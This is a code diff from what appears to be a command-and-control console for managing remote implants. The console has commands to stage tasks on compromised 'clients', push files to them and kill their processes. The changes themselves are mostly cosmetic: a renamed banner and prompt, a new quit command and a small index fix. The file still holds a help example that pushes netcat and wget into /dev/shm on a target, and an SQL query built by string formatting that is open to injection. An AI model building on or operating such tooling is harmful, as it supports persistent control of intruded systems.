@@ -50,10 +50,10 @@ var LivePrefixState struct {
 type ClientIdentity struct {
 	Id 		int 	`db:"id"`
 	Node 		string 	`db:"node"`
-	Arch 		string 	`db:"arch"`
+	Arch 	string 	`db:"arch"`
 	Os 		string 	`db:"os"`
 	Secret          string  `db:"secret"`
-	Comms        	string  `db:"comms"`
+	Comms	        string  `db:"comms"`
 	Flex          	string 	`db:"flex"`
 	FirstSeen 	int64 	`db:"firstSeen"`
 	LastSeen 	int64 	`db:"lastSeen"`
@@ -86,7 +86,7 @@ func main() {
 
 	initShell(*config)
 
-	myFigure := figure.NewFigure("OsoConMigo", "block", true)
+	myFigure := figure.NewFigure("Oso Con Migo", "block", true)
 	myFigure.Print()
 	fmt.Println("v2.0")
 
@@ -96,7 +96,7 @@ func main() {
 	p := prompt.New(
 		executor,
 		completer,
-		prompt.OptionPrefix("Koala -> "),
+		prompt.OptionPrefix("Grizzly -> "),
 		prompt.OptionLivePrefix(changeLivePrefix),
 		prompt.OptionTitle("OsoConMigo"),
 	)
@@ -202,7 +202,7 @@ func executor(in string) {
 		}
 	case "kill":
 		if checkLiveAndActive() && len(c) == 1 {
-			task := taskClientWithJob(strings.TrimSpace(c[1]))
+			task := taskClientWithJob(strings.TrimSpace(c[0]))
 			AddClientTask(task)
 		} else {
 			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes 0 arguments.")
@@ -317,6 +317,9 @@ func executor(in string) {
 			fmt.Println("[!] Invalid command. Must be tagged into an client. Takes local file + remote file.")
 			fmt.Println("Example: push /tmp/nc /dev/shm/nc || push /tmp/wget /dev/shm/wget")
 		}
+	case "quit":
+		fmt.Println("[->] Goodbye and thank you for bearing with me")
+		os.Exit(2)
 	}
 }
 
@@ -338,6 +341,7 @@ func completer(d prompt.Document) []prompt.Suggest {
 		{Text: "set flex", Description: "Revoke a deployed task"},
 		{Text: "staged", Description: "Display staged tasks for an client"},
 		{Text: "kill", Description: "Terminate the client process"},
+		{Text: "quit", Description: "Exit the shell"},
 	}
 	return prompt.FilterHasPrefix(s, d.GetWordBeforeCursor(), true)
 }
@@ -596,4 +600,8 @@ func FlushJobs(n string) {
 	u := "DELETE FROM tasks WHERE node='%s' AND status='Staged'"
 	c := fmt.Sprintf(u, n)
 	exec(c)
+}
+
+func DumpClient(n string) {
+	// TODO: Query all and write to outfile
 }
